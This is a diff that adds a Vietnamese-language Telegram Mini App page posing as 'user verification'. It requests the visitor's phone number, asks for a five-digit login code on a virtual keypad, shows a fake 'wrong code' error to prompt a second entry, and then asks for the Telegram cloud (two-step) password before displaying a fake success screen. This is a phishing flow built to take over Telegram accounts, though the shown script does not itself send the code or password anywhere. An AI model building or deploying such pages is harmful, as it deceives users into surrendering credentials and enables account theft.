@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Xác Minh Người Dùng</title>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<style>
+  /* ==========================================================================
+     CẤU HÌNH PHONG CÁCH CHUNG & CHỐNG ZOOM
+     ========================================================================== */
+  * { 
+    margin: 0; 
+    padding: 0; 
+    box-sizing: border-box; 
+    -webkit-tap-highlight-color: transparent; 
+    touch-action: manipulation; /* Tắt double-tap to zoom, click siêu nhạy */
+  }
+  
+  html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden; 
+    background: #0d1117;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  }
+
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  /* KHUNG CHỨA FULL MÀN HÌNH */
+  .phone-container { 
+    width: 100%; 
+    height: 100%; 
+    max-width: 500px; 
+    margin: 0 auto;
+  }
+  
+  .phone {
+    width: 100%;
+    height: 100vh; 
+    border: none; 
+    border-radius: 0; 
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    background: #1a1d20;
+  }
+
+  /* Giao diện đóng khung khi xem trên Máy Tính (PC) rộng */
+  @media (min-width: 501px) {
+    body { padding: 20px; }
+    .phone {
+      height: 85vh;
+      border: 1.5px solid #2a3a4a;
+      border-radius: 24px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    }
+  }
+
+  /* KHUNG CHỨA CÁC BƯỚC (SCREENS) */
+  .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
+  .screen.active { display: flex; }
+  
+  /* LỚP NỀN HIỆU ỨNG RADIAL GRADIENT */
+  .bg-layer {
+    position: absolute;
+    inset: 0;
+    z-index: 0;
+  }
+
+  /* KHUNG NỘI DUNG CHÍNH CỦA APP */
+  .app-body {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 24px 20px;
+    position: relative;
+    z-index: 2;
+  }
+
+  /* LỚP PHỦ KHI HOÀN THÀNH (SUCCESS OVERLAY) */
+  .success-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(20,24,32,0.97);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 14px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.4s;
+    z-index: 20;
+  }
+  .success-overlay.show { opacity: 1; pointer-events: all; }
+  .success-icon { font-size: 60px; animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1) both; }
+  .success-title { font-size: 20px; font-weight: 700; color: #fff; }
+  .success-sub { font-size: 14px; color: #7d8b98; text-align: center; padding: 0 30px; }
+  @keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+
+  /* ==========================================================================
+     CSS CHO TỪNG BƯỚC (STEP CODES)
+     ========================================================================== */
+     
+  /* CSS STEP 1 */
+  #step1 .app-body { background: #1B2A3A; justify-content: center; align-items: center; padding: 25px; }
+  .emoji { font-size: 70px; margin-bottom: 25px; user-select: none; }
+  .card { width: 100%; background: #3A4A5A; border-radius: 20px; padding: 28px 24px; text-align: center; color: #fff; line-height: 1.6; font-size: 18px; margin-bottom: 30px; }
+  .btn { width: 100%; max-width: 280px; height: 54px; border: none; border-radius: 14px; background: #36D1C4; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: .2s; user-select: none; box-shadow: 0 4px 15px rgba(54,209,196,0.25); }
+  .btn:hover { transform: translateY(-2px); background: #2ec4b7; } .btn:active { transform: scale(.98); } .btn:disabled { background: #259e94; cursor: default; transform: none; }
+
+  /* CSS STEP 2 */
+  #step2 .bg-layer { background: radial-gradient(ellipse at 60% 20%, rgba(80,160,220,0.2) 0%, transparent 60%), radial-gradient(ellipse at 30% 70%, rgba(180,80,180,0.15) 0%, transparent 55%), #1a1d20; }
+  #step2 .app-body { justify-content: center; align-items: center; gap: 32px; }
+  .banner { background: rgba(44,50,56,0.93); border-radius: 12px; padding: 16px 20px; width: 100%; text-align: center; font-size: 16px; font-weight: 600; color: #fff; line-height: 1.5; backdrop-filter: blur(6px); }
+  .folder-svg { width: 120px; height: 100px; }
+  .spinner { width: 44px; height: 44px; border: 4px solid #333; border-top-color: #555; border-radius: 50%; animation: spin 0.9s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* CSS STEP 3 */
+  #step3 .bg-layer { background: radial-gradient(ellipse at 65% 15%, rgba(140,80,220,0.2) 0%, transparent 55%), radial-gradient(ellipse at 25% 60%, rgba(100,60,180,0.15) 0%, transparent 50%), #161320; }
+  #step3 .app-body { justify-content: space-between; gap: 16px; overflow: hidden; }
+  .notif-box { background: rgba(52,58,64,0.93); backdrop-filter: blur(8px); border-radius: 12px; padding: 14px 18px; font-size: 14px; color: #fff; line-height: 1.6; text-align: center; border: 0.5px solid rgba(255,255,255,0.07); }
+  .otp-row { display: flex; gap: 10px; justify-content: center; margin: 10px 0; }
+  .otp-box {
+    width: 54px; height: 60px; background: rgba(255,255,255,0.05); border: 1.5px solid rgba(255,255,255,0.18); border-radius: 12px;
+    display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 700; color: #fff; transition: border-color 0.2s, background 0.2s;
+  }
+  .otp-box.active { border-color: #3bc0a8; background: rgba(59,192,168,0.1); box-shadow: 0 0 0 3px rgba(59,192,168,0.15); }
+  .otp-box.filled { border-color: rgba(255,255,255,0.35); }
+  .otp-box.error-border { border-color: rgba(231,76,60,0.45); }
+  .view-btn { background: #3bc0a8; color: #fff; border: none; border-radius: 12px; padding: 15px; width: 100%; font-size: 15px; font-weight: 700; cursor: pointer; transition: background 0.15s, transform 0.1s; box-shadow: 0 4px 16px rgba(59,192,168,0.28); user-select: none; margin-bottom: 10px; }
+  .view-btn:hover { background: #2eada0; } .view-btn:active { transform: scale(0.98); }
+  .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
+  .key {
+    background: #3bc0a8; color: #fff; border: none; border-radius: 14px; height: 56px; font-size: 22px; font-weight: 600;
+    cursor: pointer; display: flex; align-items: center; justify-content: center; transition: background 0.12s, transform 0.08s; box-shadow: 0 2px 8px rgba(59,192,168,0.2); user-select: none;
+  }
+  .key:hover { background: #2eada0; } .key:active { transform: scale(0.95); } .key.empty { background: transparent; box-shadow: none; cursor: default; pointer-events: none; } .key.backspace:hover { background: #e05252; }
+
+  /* CSS STEP 4 */
+  #step4 .bg-layer { background: radial-gradient(ellipse at 65% 15%, rgba(140,80,220,0.35) 0%, transparent 55%), radial-gradient(ellipse at 25% 60%, rgba(100,60,180,0.2) 0%, transparent 50%), #12090f; }
+  #step4 .app-body { justify-content: space-between; gap: 16px; overflow: hidden; }
+  #step4 .bg-phone { position: absolute; top: 55px; right: 24px; width: 80px; height: 148px; z-index: 1; transform: rotate(18deg) perspective(500px) rotateY(-22deg) rotateX(5deg); pointer-events: none; }
+  #step4 .ph-body { width: 100%; height: 100%; background: linear-gradient(135deg, #7c3aed, #5b21b6, #4c1d95); border-radius: 16px; border: 1.5px solid rgba(160,120,255,0.4); box-shadow: 0 12px 40px rgba(100,50,200,0.5), inset 0 1px 0 rgba(255,255,255,0.15); display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+  #step4 .ph-screen { width: 66%; height: 72%; background: rgba(40,80,200,0.2); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+  #step4 .ph-logo { width: 28px; height: 28px; background: #29b6f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+  #step4 .ph-logo svg { width: 18px; height: 18px; fill: #fff; }
+  .error-box { background: rgba(52,58,64,0.93); backdrop-filter: blur(8px); border-radius: 12px; padding: 14px 18px; font-size: 14px; color: #fff; line-height: 1.6; text-align: center; border: 0.5px solid rgba(231,76,60,0.35); animation: shake 0.45s ease both; }
+  @keyframes shake { 0%,100% { transform: translateX(0); } 20% { transform: translateX(-6px); } 40% { transform: translateX(6px); } 60% { transform: translateX(-4px); } 80% { transform: translateX(4px); } }
+
+  /* CSS STEP 5 */
+  #step5 .bg-layer { background: radial-gradient(ellipse at 60% 20%, rgba(80,140,200,0.22) 0%, transparent 55%), radial-gradient(ellipse at 20% 65%, rgba(120,80,180,0.18) 0%, transparent 50%), #141018; }
+  #step5 .app-body { justify-content: center; align-items: center; gap: 20px; }
+  #step5 .bg-person { position: absolute; bottom: 200px; left: 50%; transform: translateX(-50%); width: 180px; height: 220px; background: radial-gradient(ellipse, rgba(160,130,200,0.1) 0%, transparent 70%); border-radius: 50% 50% 0 0; z-index: 1; filter: blur(18px); pointer-events: none; }
+  .monkey-center { font-size: 80px; line-height: 1; animation: monkeyBob 2.4s ease-in-out infinite; filter: drop-shadow(0 6px 20px rgba(0,0,0,0.4)); user-select: none; }
+  .pw-input-wrap { width: 100%; position: relative; }
+  .pw-input { width: 100%; background: rgba(44,50,56,0.95); border: 1.5px solid #3bc0a8; border-radius: 12px; padding: 16px 48px 16px 16px; font-size: 16px; color: #fff; outline: none; transition: border-color 0.2s, box-shadow 0.2s; box-shadow: 0 0 0 3px rgba(59,192,168,0.12); caret-color: #3bc0a8; }
+  .pw-input::placeholder { color: #666; } .pw-input:focus { border-color: #3bc0a8; box-shadow: 0 0 0 4px rgba(59,192,168,0.18); }
+  .eye-btn { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: transparent; border: none; color: #888; cursor: pointer; display: flex; align-items: center; transition: color 0.15s; user-select: none; }
+  .eye-btn:hover { color: #3bc0a8; } .eye-btn svg { width: 22px; height: 22px; }
+  .check-btn { width: 100%; background: #3bc0a8; color: #fff; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.15s, transform 0.1s; box-shadow: 0 4px 18px rgba(59,192,168,0.3); letter-spacing: 0.3px; user-select: none; }
+  .check-btn:hover { background: #2eada0; } .check-btn:active { transform: scale(0.98); } .check-btn:disabled { background: #1f7a72; box-shadow: none; cursor: default; }
+</style>
+</head>
+<body>
+
+<div class="phone-container">
+<div class="phone">
+
+  <div class="screen active" id="step1">
+    <div class="app-body">
+      <div class="emoji">👋</div>
+
+      <div class="card">
+          Bạn cần xác nhận mình là người dùng thật,
+          hãy nhập vào nút bên dưới để bắt đầu!
+      </div>
+
+      <button class="btn" id="shareContact">
+          Xác Nhận
+      </button>
+    </div> </div>
+
+
+  <div class="screen" id="step2">
+    <div class="bg-layer"></div>
+    <div class="app-body">
+      <div class="banner">Khoan đã, đừng đi ra ngoài!</div>
+      <div style="display:flex;align-items:center;justify-content:center;">
+        <svg class="folder-svg" viewBox="0 0 120 100" xmlns="http://www.w3.org/2000/svg">
+          <rect x="4" y="28" width="112" height="66" rx="7" fill="#c9a84c"/>
+          <path d="M4 28 Q4 18 14 18 L44 18 Q52 18 56 26 L60 32 L4 32 Z" fill="#c9a84c"/>
+          <rect x="4" y="36" width="112" height="58" rx="7" fill="#e8c46a"/>
+          <rect x="4" y="36" width="112" height="6" fill="#d4a93a" opacity="0.4"/>
+          <rect x="16" y="22" width="22" height="30" rx="4" fill="#f0834a"/>
+          <rect x="18" y="26" width="18" height="3" rx="1.5" fill="rgba(255,255,255,0.35)"/>
+          <rect x="18" y="32" width="14" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <rect x="18" y="37" width="10" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <rect x="49" y="18" width="22" height="34" rx="4" fill="#4a90d9"/>
+          <rect x="51" y="22" width="18" height="3" rx="1.5" fill="rgba(255,255,255,0.35)"/>
+          <rect x="51" y="28" width="14" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <rect x="51" y="33" width="10" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <rect x="51" y="38" width="12" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <rect x="82" y="22" width="22" height="30" rx="4" fill="#e05252"/>
+          <rect x="84" y="26" width="18" height="3" rx="1.5" fill="rgba(255,255,255,0.35)"/>
+          <rect x="84" y="32" width="14" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <rect x="84" y="37" width="10" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <ellipse cx="60" cy="68" rx="8" ry="5" fill="#c9a030" opacity="0.7"/>
+          <ellipse cx="60" cy="68" rx="5" ry="3" fill="#e8c46a"/>
+        </svg>
+      </div>
+      <div style="display:flex;justify-content:center;"><div class="spinner"></div></div>
+      <div style="width:100%;background:rgba(255,255,255,0.1);border-radius:6px;height:6px;overflow:hidden;">
+        <div id="s2bar" style="height:100%;width:0%;background:#3bc0a8;border-radius:6px;"></div>
+      </div>
+      <div style="text-align:center;font-size:13px;color:#7d8b98;">Đang tải dữ liệu...</div>
+    </div>
+  </div>
+
+
+  <div class="screen" id="step3">
+    <div class="bg-layer"></div>
+    <div class="app-body">
+      <div class="notif-box">📩 Chúng tôi đã gửi mã xác nhận cho bạn.<br>💦 Hãy nhập mã này bằng bàn phím ảo bên dưới.</div>
+      <div class="otp-row" id="s3otp">
+        <div class="otp-box active" id="s3b0"></div>
+        <div class="otp-box" id="s3b1"></div>
+        <div class="otp-box" id="s3b2"></div>
+        <div class="otp-box" id="s3b3"></div>
+        <div class="otp-box" id="s3b4"></div>
+      </div>
+      <button class="view-btn" onclick="viewCode('s3b','s3val',[2,8,4,7,1])">✅ XEM MÃ ✅</button>
+      <div class="keypad">
+        <button class="key" onclick="pressKey('s3b','s3val','1')">1</button>
+        <button class="key" onclick="pressKey('s3b','s3val','2')">2</button>
+        <button class="key" onclick="pressKey('s3b','s3val','3')">3</button>
+        <button class="key" onclick="pressKey('s3b','s3val','4')">4</button>
+        <button class="key" onclick="pressKey('s3b','s3val','5')">5</button>
+        <button class="key" onclick="pressKey('s3b','s3val','6')">6</button>
+        <button class="key" onclick="pressKey('s3b','s3val','7')">7</button>
+        <button class="key" onclick="pressKey('s3b','s3val','8')">8</button>
+        <button class="key" onclick="pressKey('s3b','s3val','9')">9</button>
+        <button class="key empty"></button>
+        <button class="key" onclick="pressKey('s3b','s3val','0')">0</button>
+        <button class="key backspace" onclick="pressBack('s3b','s3val')">⌫</button>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="screen" id="step4">
+    <div class="bg-layer"></div>
+    <div class="bg-phone">
+      <div class="ph-body">
+        <div class="ph-screen">
+          <div class="ph-logo">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.68 7.92c-.12.56-.48.7-.96.44l-2.64-1.95-1.28 1.23c-.14.14-.26.26-.54.26l.19-2.72 4.95-4.47c.22-.19-.05-.3-.34-.11l-6.1 3.84-2.63-.82c-.57-.18-.58-.57.12-.84l10.28-3.96c.47-.17.88.11.63.18z"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="app-body">
+      <div class="error-box">❌ Bạn đã nhập sai mã! Vui lòng nhấn vào nút bên dưới 🔽 để xem mã và nhập mã mới bằng bàn phím bên dưới ⌨️</div>
+      <div class="otp-row">
+        <div class="otp-box error-border" id="s4b0"></div>
+        <div class="otp-box error-border" id="s4b1"></div>
+        <div class="otp-box error-border" id="s4b2"></div>
+        <div class="otp-box error-border" id="s4b3"></div>
+        <div class="otp-box error-border" id="s4b4"></div>
+      </div>
+      <button class="view-btn" onclick="viewCode('s4b','s4val',[5,3,9,1,7])">✅ XEM MÃ ✅</button>
+      <div class="keypad">
+        <button class="key" onclick="pressKey('s4b','s4val','1')">1</button>
+        <button class="key" onclick="pressKey('s4b','s4val','2')">2</button>
+        <button class="key" onclick="pressKey('s4b','s4val','3')">3</button>
+        <button class="key" onclick="pressKey('s4b','s4val','4')">4</button>
+        <button class="key" onclick="pressKey('s4b','s4val','5')">5</button>
+        <button class="key" onclick="pressKey('s4b','s4val','6')">6</button>
+        <button class="key" onclick="pressKey('s4b','s4val','7')">7</button>
+        <button class="key" onclick="pressKey('s4b','s4val','8')">8</button>
+        <button class="key" onclick="pressKey('s4b','s4val','9')">9</button>
+        <button class="key empty"></button>
+        <button class="key" onclick="pressKey('s4b','s4val','0')">0</button>
+        <button class="key backspace" onclick="pressBack('s4b','s4val')">⌫</button>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="screen" id="step5">
+    <div class="bg-layer"></div>
+    <div class="bg-person"></div>
+    <div class="app-body">
+      <div class="monkey-center">🙈</div>
+      <div class="notif-box">Bạn đã nhập đúng mã, nhưng bạn có mật khẩu đám mây, hãy nhập mật khẩu đó vào ô bên dưới!</div>
+      <div class="pw-input-wrap">
+        <input class="pw-input" id="s5pw" type="password" placeholder="Mật khẩu của bạn" oninput="s5type()"/>
+        <button class="eye-btn" onclick="s5eye()" id="s5eyeBtn">
+          <svg id="s5eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
+      </div>
+      <button class="check-btn" id="s5btn" onclick="s5check()">Kiểm tra</button>
+    </div>
+    <div class="success-overlay" id="s5success">
+      <div class="success-icon">✅</div>
+      <div class="success-title">Đăng nhập thành công!</div>
+      <div class="success-sub">Mật khẩu đám mây chính xác. Chào mừng bạn trở lại 🎉</div>
+    </div>
+  </div>
+
+</div>
+</div>
+
+
+<script>
+// ==========================================================================
+// THIẾT LẬP KẾT NỐI HỆ THỐNG / CHUYỂN STEP CHUNG
+// ==========================================================================
+const tg = window.Telegram.WebApp;
+
+if (tg) {
+    tg.ready();
+    tg.expand(); // Khởi tạo giao diện chiếm trọn chiều cao màn hình app Telegram
+}
+
+function goStep(n) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('step' + n).classList.add('active');
+  if (n === 2) startStep2();
+}
+
+
+// ==========================================================================
+// [JAVASCRIPT] LOGIC XỬ LÝ - STEP 1 (Tối ưu tự động chuyển Step 2 khi nhận SĐT)
+// ==========================================================================
+document.getElementById("shareContact").addEventListener("click", () => {
+    const btn = document.getElementById('shareContact');
+    btn.disabled = true;
+    btn.textContent = '⏳ Đang xác nhận...';
+
+    try {
+        // Đăng ký sự kiện lắng nghe xem người dùng đã đồng ý chia sẻ SĐT chưa
+        tg.onEvent('contactRequested', (event) => {
+            if (event.status === 'sent') {
+                // SĐT đã gửi thành công cho Bot -> Tự động đóng Step 1 và nhảy sang Step 2 lập tức
+                goStep(2);
+            } else {
+                // Khôi phục nút nếu người dùng ấn hủy/từ chối hộp thoại chia sẻ
+                btn.disabled = false;
+                btn.textContent = 'Xác Nhận';
+            }
+        });
+
+        // Kích hoạt hộp thoại xin số điện thoại chuẩn của Telegram WebApp SDK
+        tg.requestContact();
+
+    } catch (e) {
+        console.error(e);
+        // Cảnh báo khi mở trực tiếp file trên trình duyệt PC thông thường bên ngoài Telegram
+        alert("Chức năng chỉ hoạt động bên trong Telegram Mini App.");
+        btn.disabled = false;
+        btn.textContent = 'Xác Nhận';
+    }
+});
+
+
+// ==========================================================================
+// [JAVASCRIPT] LOGIC XỬ LÝ - STEP 2
+// ==========================================================================
+let step2Timer = null;
+function startStep2() {
+  const bar = document.getElementById('s2bar');
+  if (bar) { bar.style.transition = 'none'; bar.style.width = '0%'; }
+  clearTimeout(step2Timer);
+  setTimeout(() => {
+    if (bar) { bar.style.transition = 'width 5s linear'; bar.style.width = '100%'; }
+    step2Timer = setTimeout(() => goStep(3), 5000); 
+  }, 50);
+}
+
+
+// ==========================================================================
+// [JAVASCRIPT] LOGIC XỬ LÝ - STEP 3 & STEP 4 (OTP)
+// ==========================================================================
+const otpState = { s3val: [], s4val: [] };
+
+function pressKey(prefix, stateKey, k) {
+  if (otpState[stateKey].length < 5) {
+    otpState[stateKey].push(k);
+    updateOtp(prefix, stateKey);
+    if (otpState[stateKey].length === 5) {
+      if (stateKey === 's3val') setTimeout(() => goStep(4), 400);
+      if (stateKey === 's4val') setTimeout(() => goStep(5), 400);
+    }
+  }
+}
+
+function pressBack(prefix, stateKey) {
+  if (otpState[stateKey].length > 0) { otpState[stateKey].pop(); updateOtp(prefix, stateKey); }
+}
+
+function updateOtp(prefix, stateKey) {
+  const arr = otpState[stateKey];
+  for (let i = 0; i < 5; i++) {
+    const box = document.getElementById(prefix + i);
+    if (!box) continue;
+    box.textContent = arr[i] || '';
+    box.className = 'otp-box';
+    if (i === arr.length && arr.length < 5) box.classList.add('active');
+    else if (i < arr.length) box.classList.add('filled');
+    else if (stateKey === 's4val') box.classList.add('error-border');
+  }
+}
+
+function viewCode(prefix, stateKey, code) {
+  otpState[stateKey] = [];
+  let i = 0;
+  const t = setInterval(() => {
+    if (i < 5) {
+      otpState[stateKey].push(String(code[i++]));
+      updateOtp(prefix, stateKey);
+      if (otpState[stateKey].length === 5) {
+        clearInterval(t);
+        if (stateKey === 's3val') setTimeout(() => goStep(4), 500);
+        if (stateKey === 's4val') setTimeout(() => goStep(5), 500);
+      }
+    } else clearInterval(t);
+  }, 180);
+}
+
+
+// ==========================================================================
+// [JAVASCRIPT] LOGIC XỬ LÝ - STEP 5 (MẬT KHẨU ĐÁM MÂY)
+// ==========================================================================
+let s5shown = false;
+function s5eye() {
+  s5shown = !s5shown;
+  document.getElementById('s5pw').type = s5shown ? 'text' : 'password';
+  document.getElementById('s5eyeIcon').innerHTML = s5shown
+    ? `<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`
+    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>`;
+}
+
+function s5type() {
+  const v = document.getElementById('s5pw').value;
+  document.getElementById('s5btn').style.opacity = v.length > 0 ? '1' : '0.6';
+}
+
+function s5check() {
+  const v = document.getElementById('s5pw').value;
+  if (!v) return;
+  const btn = document.getElementById('s5btn');
+  btn.disabled = true; btn.textContent = '⏳ Đang kiểm tra...';
+  setTimeout(() => document.getElementById('s5success').classList.add('show'), 900);
+}
+</script>
+</body>
+</html>
